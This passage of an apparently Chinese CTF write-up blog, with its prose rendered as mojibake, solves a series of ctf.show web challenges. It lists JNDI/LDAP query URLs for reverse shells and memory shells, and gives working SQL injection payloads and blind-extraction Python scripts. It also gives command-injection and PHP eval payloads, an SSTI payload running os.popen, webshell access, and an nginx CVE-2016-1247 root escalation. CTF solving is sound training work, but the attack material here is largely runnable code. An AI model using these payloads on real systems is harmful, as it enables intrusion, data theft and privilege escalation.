ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells</span><br><span class="line"></span><br><span class="line">[+] TomcatBypass Queries</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]</span><br><span class="line">    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] GroovyBypass Queries</span><br><span class="line">    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]</span><br><span class="line"></span><br><span class="line">[+] WebsphereBypass Queries</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp</span><br></pre></td></tr></table></figure>

<p>éš¾å¤ç°çš„ä¸€bï¼Œå‚»é€¼ä¸œè¥¿</p>
<h2 id="ç»™å¥¹"><a href="#ç»™å¥¹" class="headerlink" title="ç»™å¥¹"></a>ç»™å¥¹</h2><p>dirbæ‰«å‡º.gitæ³„éœ²ï¼Œç›´æ¥githackæŠ“ä¸‹æ¥ä¸ªhint.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass=sprintf(&quot;and pass=&#x27;%s&#x27;&quot;,addslashes($_GET[&#x27;pass&#x27;]));</span><br><span class="line">$sql=sprintf(&quot;select * from user where name=&#x27;%s&#x27; $pass&quot;,addslashes($_GET[&#x27;name&#x27;]));</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦çš„é—®é¢˜å‡ºç°åœ¨$sqlä¸­ï¼Œä½¿ç”¨äº†ç¬¬äºŒæ¬¡sprintfæ“ä½œï¼Œè€Œä¸”$passçš„å€¼ç›¸å¯¹å¯æ§</p>
<p>sprintfç”¨äºæŠŠæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²å†™å…¥ä¸€ä¸ªå˜é‡ä¸­</p>
<p>è€Œç”¨äºæ¥æ”¶çš„å­—ç¬¦æ ¼å¼å€¼å›ºå®šï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%% -&gt; è¿”å›ä¸€ä¸ªç™¾åˆ†å· %ï¼Œ%b -&gt; äºŒè¿›åˆ¶æ•°ï¼Œ%s -&gt; å­—ç¬¦ä¸²</span><br><span class="line">ç­‰</span><br></pre></td></tr></table></figure>

<p>å½“%åæ‰€æŒ‡å®šçš„ç±»å‹æ˜¯æ— æ³•è¯†åˆ«å ä½ç¬¦ç±»å‹æ—¶ï¼Œsprintfä¼šå°†å…¶ç½®ç©º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;this_is_%&#x27;&quot;-&gt;sprintfå¤„ç†ï¼Œç”±äº%&#x27;ä¸è¢«è¯†åˆ«ï¼Œç½®ç©º-&gt;&quot;this_is_&quot;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§è¿›è¡Œç»•è¿‡addslashes</p>
<p>ç¬¬ä¸€æ¬¡addslashes+sprintf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&#x27;pass&#x27;]=test%1$&#x27;#</span><br><span class="line">$pass=&quot;and pass=test%1$\&#x27;#&quot;</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ¬¡addslashes+sprintfï¼Œ$passç›´æ¥è¢«æ‹¼æ¥è¿›å»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;select * from user where name=&#x27;%s&#x27; and pass=&#x27;test%1$\&#x27;#&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p>å°±åœ¨è¿™ä¸ªæ—¶å€™ï¼Œå¯¹$sqlè¿›è¡Œsprintfå¤„ç†ï¼Œ%1$\è¢«ç½®ç©ºï¼Œç•™ä¸‹æ¥çš„å°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where name=&#x27;%s&#x27; and pass=&#x27;test&#x27;#&#x27;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸé—­åˆ</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=1&amp;pass=%1$&#x27; or 1=1%23</span><br></pre></td></tr></table></figure>

<p>è¿›å»ç¬¬äºŒæ­¥æ˜æ˜¾å‘ç°é¡µé¢ä¸å¯¹ï¼Œçœ‹ä¸€çœ¼æµé‡ï¼Œæ³¨æ„åˆ°cookieæœ‰fileå­—æ®µï¼ŒCyberChefç›´æ¥æ‰“å‡ºæ¥æ˜¯stringè½¬16è¿›åˆ¶ï¼Œè¯»&#x2F;flagæ–‡ä»¶å°±è¡Œ</p>
<h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">        system(&quot;curl https://&quot;.$_GET[&#x27;url&#x27;].&quot;.ctf.show&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=baidu.com%26%26cat%20flag%26%26</span><br></pre></td></tr></table></figure>

<h2 id="å‡èµ›ç”Ÿ"><a href="#å‡èµ›ç”Ÿ" class="headerlink" title="å‡èµ›ç”Ÿ"></a>å‡èµ›ç”Ÿ</h2><p>å°±æ˜¯å„ç§åˆ©ç”¨ç©ºæ ¼</p>
<p>æç¤ºregister.phpå’Œlogin.phpï¼Œè¿˜ç»™äº†indexæºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">if(empty($_SESSION[&#x27;name&#x27;]))&#123;</span><br><span class="line">    show_source(&quot;index.php&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $name=$_SESSION[&#x27;name&#x27;];</span><br><span class="line">    $sql=&#x27;select pass from user where name=&quot;&#x27;.$name.&#x27;&quot;&#x27;;</span><br><span class="line">    echo $sql.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    system(&#x27;4rfvbgt56yhn.sh&#x27;);</span><br><span class="line">    $query=mysqli_query($conn,$sql);</span><br><span class="line">    $result=mysqli_fetch_assoc($query);</span><br><span class="line">    if($name===&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo &quot;admin!!!!!&quot;.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">        if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">            preg_replace_callback(&quot;/\w\W*/&quot;,function()&#123;die(&quot;not allowed!&quot;);&#125;,$_GET[&#x27;c&#x27;],1);</span><br><span class="line">            echo $flag;</span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥æ²¡æœ‰èƒ½sessionååºåˆ—åŒ–çš„åœ°æ–¹ï¼Œregisterå°è¯•æ³¨å†Œadminä¸å…è®¸</p>
<p>ä½†æ˜¯åœ¨sqlä¸­ï¼Œç©ºæ ¼çš„æ“ä½œè¿˜æŒºæœ‰æ„æ€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM `admininfo` where realname = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ—¶å€™å¦‚æœè¡¨ä¸­æœ‰åä¸ºâ€admin â€œçš„æ•°æ®ï¼ˆå¸¦äº†ä¸ªç©ºæ ¼ï¼‰ï¼Œä¹Ÿæ˜¯èƒ½è¢«ä¸€èµ·æŸ¥è¯¢å‡ºæ¥çš„</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312061210488.png" alt="image-20231206121034404"></p>
<p>æ³¨å†Œçš„æ—¶å€™ä¼ å…¥çš„â€adminâ€å’Œâ€admin â€œåˆæ˜¯ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ç›´æ¥æ³¨å†Œâ€admin â€œï¼Œç™»é™†â€adminâ€å°±è¡Œ</p>
<p>ç¬¬äºŒæ­¥å°±æ˜¯ç»•è¿‡åˆ¤æ–­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace_callback(&quot;/\w\W*/&quot;,function()&#123;die(&quot;not allowed!&quot;);&#125;,$_GET[&#x27;c&#x27;],1);</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">import regex</span><br><span class="line"></span><br><span class="line">fuzz = string.printable</span><br><span class="line">for i in fuzz:</span><br><span class="line">    if not regex.match(r&quot;\w\W*&quot;, i):</span><br><span class="line">        print(i, end = &quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>æ‰“å‡ºæ¥çš„ç»“æœæ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^`&#123;|&#125;~ 	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>éšä¾¿ä¼ ä¸ª?c&#x3D;!å°±è¡Œ</p>
<h2 id="èŒæ–°è®°å¿†"><a href="#èŒæ–°è®°å¿†" class="headerlink" title="èŒæ–°è®°å¿†"></a>èŒæ–°è®°å¿†</h2><p>è¿›å»æ‰«ç½‘å‡ºæ¥ä¸ª&#x2F;admin</p>
<p>sqlå…ˆè¯•æ¢ä¸€ä¸‹ï¼Œpasswordéƒ¨åˆ†ä¼°è®¡æ˜¯md5ï¼Œæ²¡æ³•é—­åˆï¼Œusernameå•å¼•å·é—­åˆï¼Œç®€å•fuzzä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://dcf0879c-3bff-4175-817e-a3a631e1dfc0.challenge.ctf.show/admin/checklogin.php&quot;</span><br><span class="line">fuzz = string.printable</span><br><span class="line">sql_payload = [&quot;select&quot;, &quot;union&quot;, &quot;or&quot;, &quot;and&quot;, &quot;||&quot;, &quot;&amp;&amp;&quot;, &quot;from&quot;, &quot;where&quot;, &quot;order&quot;, &quot;group&quot;, &quot;by&quot;, &quot;having&quot;, &quot;like&quot;,</span><br><span class="line">               &quot;updatexml&quot;, &quot;order&quot;, &quot;exp&quot;, &quot;floor&quot;, &quot;rand&quot;, &quot;extractvalue&quot;, &quot;geometrycollection&quot;, &quot;multipoint&quot;,</span><br><span class="line">               &quot;polygon&quot;, &quot;multipolygon&quot;, &quot;linestring&quot;, &quot;multilinestring&quot;, &quot;sleep&quot;, &quot;length&quot;, &quot;substr&quot;, &quot;mid&quot;, &quot;ascii&quot;,</span><br><span class="line">               &quot;ord&quot;, &quot;if&quot;, &quot;/**/&quot;, &quot;//&quot;]</span><br><span class="line">for i in fuzz:</span><br><span class="line">    re = requests.post(url, data = &#123;&quot;u&quot;: i, &quot;p&quot;: &quot;1&quot;&#125;)</span><br><span class="line">    if &quot;æˆ‘æŠ¥è­¦äº†&quot; in re.text:</span><br><span class="line">        print(i, end = &quot; &quot;)</span><br><span class="line">for sqls in sql_payload:</span><br><span class="line">    re = requests.post(url, data = &#123;&quot;u&quot;: sqls, &quot;p&quot;: &quot;1&quot;&#125;)</span><br><span class="line">    if &quot;æˆ‘æŠ¥è­¦äº†&quot; in re.text:</span><br><span class="line">        print(sqls, end = &quot; &quot;)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">! &quot; # % &amp; * + - . : ; = &gt; ? @ ] ^ _ ` &#123; &#125; ~ select union or and &amp;&amp; from where order by having like order floor rand sleep mid ascii ord if /**/</span><br></pre></td></tr></table></figure>

<p>é‚£å…¶å®ä¹Ÿæ²¡åŠæ³•é—­åˆäº†</p>
<p>å¯ä»¥çŒœæµ‹ä¸€ä¸‹é‡Œè¾¹çš„sqlè¯­å¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where username = &#x27;$_POST[&quot;u&quot;]&#x27; and &#x27;$_POST[&quot;p&quot;]&#x27;;</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯åº”è¯¥çŸ¥é“çš„ï¼Œå°±æ˜¯<code>åœ¨sqlè¯­å¥ä¸­ andçº§åˆ«é«˜äºor</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312061625942.png" alt="image-20231206162545901"></p>
<p>å…ˆ<code>1=1 and password = &#39;t&#39;</code>è¿›è¡Œè¿ç®—ï¼Œå¾—åˆ°ç»“æœ<code>1</code>ï¼Œç„¶åå†<code>where realname = &#39;admin&#39; or 1</code> å¾—åˆ°æ°¸çœŸ</p>
<p>æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥ç›´æ¥æ’ä¸€æ¡subæ¥ç›²æ³¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">letter = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">url = &quot;http://dcf0879c-3bff-4175-817e-a3a631e1dfc0.challenge.ctf.show/admin/checklogin.php&quot;</span><br><span class="line">for times in range(1, 20):</span><br><span class="line">    for i in letter:</span><br><span class="line">        payload = &quot;&#x27;||substr(p,&#123;&#125;,1)&lt;&#x27;&#123;&#125;&quot;.format(times, i)</span><br><span class="line">        re = requests.post(url, data = &#123;&quot;u&quot;: payload, &quot;p&quot;: &quot;1&quot;&#125;)</span><br><span class="line">        if re.text == &quot;å¯†ç é”™è¯¯&quot;:</span><br><span class="line">            print(letter[letter.find(i) - 1], end = &quot;&quot;)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>å¯†ç æ‰“å‡ºæ¥å»æ‰ä¸¤ä¸ªZZç™»é™†å°±è¡Œ</p>
<p>æŠ½è±¡çš„æ˜¯payloadè¿˜ä¸èƒ½å¸¦ç©ºæ ¼ï¼Œå“ˆå“ˆ</p>
<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>ä¸€çœ¼ä¸çœŸ<a href="http://www.zipæ³„å¯†,/">www.zipæ³„å¯†ï¼Œ</a></p>
<p>æ‹‰å‡ºæ¥ä»£ç å®¡è®¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">waf_login:</span><br><span class="line">if(preg_match(&quot;/load|and|or|\||\&amp;|select|union|\&#x27;|=| |\\\|,|sleep|ascii/i&quot;,$arr))</span><br><span class="line">waf_register:</span><br><span class="line">if(preg_match(&quot;/load|and|\||\&amp;| |\\\|sleep|ascii|if/i&quot;,$arr))</span><br><span class="line">register.php:</span><br><span class="line">if(isset($_POST[&#x27;e&#x27;])&amp;&amp;isset($_POST[&#x27;u&#x27;])&amp;&amp;isset($_POST[&#x27;p&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$e=$_POST[&#x27;e&#x27;];</span><br><span class="line">$u=$_POST[&#x27;u&#x27;];</span><br><span class="line">$p=$_POST[&#x27;p&#x27;];</span><br><span class="line">$sql =</span><br><span class="line">&quot;insert into test1</span><br><span class="line">set email = &#x27;$e&#x27;, </span><br><span class="line">username = &#x27;$u&#x27;,</span><br><span class="line">password = &#x27;$p&#x27;</span><br><span class="line">&quot;;</span><br><span class="line">user.php</span><br><span class="line">if (is_numeric($username))</span><br><span class="line">	&#123;	</span><br><span class="line">		if(strlen($username)&gt;10) &#123;</span><br><span class="line">			$username=substr($username,0,10);</span><br><span class="line">		&#125;</span><br><span class="line">		echo &quot;Hello $username,there&#x27;s nothing here but dog food!&quot;;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¦æ±‚ï¼š</p>
<ul>
<li>usernameéƒ¨åˆ†å¿…é¡»æ˜¯æ•°å­—</li>
<li>åœ¨æ³¨å†ŒåŠŸèƒ½çš„wafæ˜¯æ˜æ˜¾å°‘å¾ˆå¤šçš„</li>
</ul>
<p>ç™»é™†æˆåŠŸä¹‹åï¼Œå¦‚æœusernameæ˜¯çº¯æ•°å­—ï¼Œåˆ™ä¼šç›´æ¥è¾“å‡ºusernameçš„å€¼å‡ºæ¥</p>
<p>æ‰€ä»¥å¯ä»¥æ„é€ username&#x3D;select(flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag)ï¼Œå¦‚æœè¦è®©ä»–å˜æˆçº¯æ•°å­—å¹¶ä¸”asciiè¢«bançš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ä¸¤å±‚hexå‡½æ•°ï¼Œç¬¬ä¸€æ­¥å°†åŸæ–‡è½¬åŒ–ä¸º16è¿›åˆ¶ï¼Œç”±äº16è¿›åˆ¶å«ABCDEFï¼Œå†å¥—ä¸€å±‚å¯ä»¥ä¿è¯å…¨æ˜¯æ•°å­—</p>
<p>æ‰€ä»¥è¦è€ƒè™‘å¦‚ä½•é€ƒé€¸å‡º<code>username = &#39;$u&#39;</code></p>
<p>ç®€å•åœ¨$eä¸­å¤šæ‹¼æ¥ä¸€ä¸ª<code>&#39;</code>ï¼Œåé¢è·Ÿä¸Špayload</p>
<p>ä½†æ˜¯ç”±äºæ¢è¡Œçš„é™åˆ¶ï¼Œåœ¨$eä¸­ä¼ å…¥çš„payloadå¤„åœ¨åŒè¡Œï¼Œæ‰€ä»¥éœ€è¦ç”¨&#x2F;**&#x2F;çš„æ“ä½œæ¥æ³¨é‡Šå¤šè¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¦‚æœä¸ä½¿ç”¨/**/ï¼Œä»…ç”¨#æ˜¯æ— æ³•å°†æ¢è¡Œåçš„usernameå’Œpasswordæ³¨é‡Šæ‰çš„</span><br><span class="line">insert into test1</span><br><span class="line">set email = &#x27;1&#x27;,username/**/=/**/hex(hex(substr((select/**/flag/**/from/**/flag),12,1))),password/**/=/**/&#x27;pass&#x27;#&#x27;, </span><br><span class="line">username = &#x27;user&#x27;,</span><br><span class="line">password = &#x27;pass&#x27;</span><br><span class="line">æˆåŠŸçš„æ‰“æ³•</span><br><span class="line">insert into test1</span><br><span class="line">set email = &#x27;1&#x27;,username/**/=/**/hex(hex(substr((select/**/flag/**/from/**/flag),12,1))),/*&#x27;, </span><br><span class="line">username = &#x27;user*/#&#x27;,</span><br><span class="line">password = &#x27;pass&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„æ‰“æ³•å°±æˆåŠŸå°†ç¬¬ä¸‰è¡Œçš„usernameæ³¨é‡Šæ‰äº†ï¼Œå†ä½¿ç”¨ä¸€ä¸ª#æ³¨é‡Šåé¢çš„<code>&#39;#</code></p>
<p>æ‰€ä»¥ä¸€ä¸ªpocå°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e=1&#x27;,username/**/=/**/hex(hex(substr((select/**/flag/**/from/**/flag),12,1))),/*</span><br><span class="line">&amp;u=*/#</span><br><span class="line">&amp;p=pass</span><br></pre></td></tr></table></figure>

<p>ç»™å‡ºä¸€ä¸ªè„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url1 = &quot;http://7bc05111-4ec7-4214-81c9-4e8e0c259385.challenge.ctf.show/register.php&quot;</span><br><span class="line">url2 = &quot;http://7bc05111-4ec7-4214-81c9-4e8e0c259385.challenge.ctf.show/login.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    payload = &quot;hex(hex(substr((select/**/flag/**/from/**/flag),&#123;&#125;,1)))&quot;.format(i)</span><br><span class="line">    print(payload)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        &quot;e&quot;: str(i) + &quot;&#x27;,username=&quot; + payload + &quot;,/*&quot;,</span><br><span class="line">        &quot;u&quot;: &quot;*/#&quot;,</span><br><span class="line">        &quot;p&quot;: i</span><br><span class="line">    &#125;</span><br><span class="line">    r1 = s.post(url1, data = data1)</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        &quot;e&quot;: str(i),</span><br><span class="line">        &quot;p&quot;: i</span><br><span class="line">    &#125;</span><br><span class="line">    r2 = s.post(url2, data = data2)</span><br><span class="line">    t = r2.text</span><br><span class="line">    real = re.findall(&quot;Hello (.*?),&quot;, t)[0]</span><br><span class="line">    flag += real</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flagçš„åŒé‡hexè½¬stringå³å¯</p>
<h2 id="å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯-jpg"><a href="#å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯-jpg" class="headerlink" title="å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯.jpg"></a>å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯.jpg</h2><p>å˜æˆææƒäº†</p>
<p>è¿›å»ä¸€å¼ å›¾ï¼Œæç¤ºcaiå’Œèœåˆ€</p>
<p>ç›´æ¥èšå‰‘è¿ä¸Šå»ï¼Œå¯†ç cai</p>
<p>ä½†æ˜¯è¿›å»çš„ç”¨æˆ·æ˜¯www-dataï¼Œéœ€è¦è€ƒè™‘ææƒ</p>
<p>hintæç¤ºå»çœ‹çœ‹ä»€ä¹ˆæœåŠ¡</p>
<p>ç›´æ¥<code>cat /etc/crontab</code>çœ‹çœ‹æœ‰ä»€ä¹ˆæœåŠ¡</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101912715.png" alt="image-20231210191207659"></p>
<p>æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡<code>/usr/sbin/logrotate -vf /etc/logrotate.d/nginx</code></p>
<p>èšå‰‘çš„ç»ˆç«¯å¤ªå‚»é€¼äº†ï¼Œåå¼¹ä¸ªshellåˆ°æ”»å‡»æœºä¸Š</p>
<p>å·²ç»æç¤ºæ˜¯nginxæœåŠ¡+ææƒäº†ï¼Œç›´æ¥æœ‰<a href="https://www.exploit-db.com/exploits/40768">CVE-2016-1247</a></p>
<p>expæä¸‹æ¥æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod -R 777 ./nginx.sh</span><br><span class="line">./nginx.sh /var/log/nginx/error.log</span><br></pre></td></tr></table></figure>

<p>ç­‰å¾…ä¸€åˆ†é’Ÿcrontabè‡ªåŠ¨æ‰§è¡Œåææƒ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101915632.png" alt="image-20231210191545599"></p>
<h2 id="è“ç˜¦"><a href="#è“ç˜¦" class="headerlink" title="è“ç˜¦"></a>è“ç˜¦</h2><p>çœ‹ä¸€çœ¼sessionä¸€çœ¼flask sessionä¼ªé€ </p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101928773.png" alt="image-20231210192814717"></p>
<p>F12ç»™key: icanï¼Œç›´æ¥ä¼ªé€ </p>
<p>æ‰“è¿›å»æç¤º<code>ç¼ºå°‘è¯·æ±‚å‚æ•°ï¼</code></p>
<p>é¦–é¡µè¿˜æœ‰ä¸ªparam: ctfshowï¼Œä¼ ä¸ªå€¼è¿›å»å›æ˜¾</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202312101941359.png" alt="image-20231210194113312"></p>
<p>sstiç›´æ¥æ¢­ï¼Œ0è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if&#x27;war&#x27;in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ä¸€è§ˆæ— ä½™"><a href="#ä¸€è§ˆæ— ä½™" class="headerlink" title="ä¸€è§ˆæ— ä½™"></a>ä¸€è§ˆæ— ä½™</h2><p>CVE-2019-11043</p>
<p>ç‰¹ç‚¹nginx&#x2F;1.20.1</p>
<p>æ‹¿phuip-fpizdamç›´æ¥æ‰“</p>
<h2 id="ç™»é™†å°±æœ‰flag"><a href="#ç™»é™†å°±æœ‰flag" class="headerlink" title="ç™»é™†å°±æœ‰flag"></a>ç™»é™†å°±æœ‰flag</h2><p>è€ƒå¯Ÿçš„ç‚¹æ˜¯mysqlçš„éšå¼ç±»å‹è½¬æ¢</p>
<p>å½“è¾“å…¥<code>&#39;3&#39;-&#39;1&#39;</code>æ—¶ï¼Œmysqlå¼•æ“ä¼šæŠŠ<code>&#39;&#39;</code>åŒ…å«çš„å½“åšæ•°å­—è¿›è¡Œå‡æ³•è¿ç®—</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202401272232185.png" alt="image-20240127223155075"></p>
<p>fuzzä¹‹åå¯ç”¨çš„ç‰¹æ®Šå­—ç¬¦ä¸²æœ‰<code>!#$&amp;&#39;./:&lt;&gt;?@[]^_&#123;&#125;</code></p>
<p>æ˜¾ç„¶ï¼Œå¯ä»¥ç”¨&amp; ^æ¥è¿›è¡Œæ“ä½œ</p>
<p><code>select &#39;&#39;^&#39;&#39;</code>å’Œ<code>select &#39;&#39;&amp;&#39;&#39;</code>çš„ç»“æœå‡ä¸º0ï¼Œè€Œsqlçš„selectè¯­å¥åˆæœ‰ä¸ªç‰¹ç‚¹ï¼ŒæŒ‡å®š<code>where=0</code>æ—¶ï¼Œä¼šæŸ¥è¯¢æ‰€æœ‰éæ•°å­—å¼€å¤´çš„è®°å½•</p>
<p>æ‰€ä»¥å°±ç›´æ¥æ‰“ä¸€ä¸ª<code>select * from flag where u=&#39;&#39;^&#39;&#39;#</code>çš„payloadå³å¯</p>
<p>å¸‚èµ›æµ·ç‡•é‚£ä¸ªä¹Ÿèƒ½è¿™ä¹ˆæ‰“<code>&#39;*&#39;</code></p>
<h2 id="ç­¾é€€"><a href="#ç­¾é€€" class="headerlink" title="ç­¾é€€"></a>ç­¾é€€</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php ($S = $_GET[&#x27;S&#x27;])?eval(&quot;$$S&quot;):highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>evalä¸­å¯åˆ©ç”¨<code>;</code>è¿›è¡Œå¤šphpè¯­å¥æ“ä½œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=a;system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>

<p>é¢„æœŸè§£æ˜¯å˜é‡è¦†ç›–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=S=system(&#x27;cat ../flag.txt&#x27;);</span><br><span class="line">æˆ–è€…</span><br><span class="line">?S=a=system(&#x27;cat ../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿæœ‰è¿™ç§æ‰“æ³•</p>
